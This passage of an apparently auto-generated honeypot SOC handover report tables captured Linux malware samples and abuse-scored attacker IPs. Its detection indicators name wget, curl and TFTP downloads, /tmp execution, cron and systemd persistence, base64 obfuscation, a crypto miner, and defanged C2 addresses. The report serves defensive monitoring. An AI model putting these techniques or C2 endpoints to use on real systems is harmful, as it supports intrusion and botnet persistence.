| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `46.8.224[.]240` | FR | CGI GLOBAL LIMITED | **100** ⚠️ | 4 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `45.82.78[.]102` | SG | Detai Prosperous Technologies Limited | **100** ⚠️ | 50 |
| `176.65.132[.]216` | NL | TechTies Inc. | **100** ⚠️ | 7 |
| `60.214.154[.]254` | CN | China Unicom Shandong province network | **100** ⚠️ | 20 |
| `195.178.110[.]218` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `120.48.67[.]120` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 1 |
| `40.121.179[.]100` | US | Microsoft Corporation | **100** ⚠️ | 46 |
| `66.132.195[.]108` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `193.187.110[.]160` | FI | Cyberaegis Casa S.R.L. | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 193 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 170 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 62 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 42 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 40 |

---

## 🔕 False Positive Summary (69 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 15 |
| AbuseIPDB score 1 below threshold 25 | 3 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 17 below threshold 25 | 6 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 348 cases |
| Tool 34  | Credential Extractor        | ✅ 3318 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 27 fingerprints |
| Tool 36  | Command Clustering          | ✅ 60 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 193 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 69 filtered (19.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 83 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 157 priority case(s) shown individually · 109 recon entry/entries in table (8 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-03T18:48:52Z_
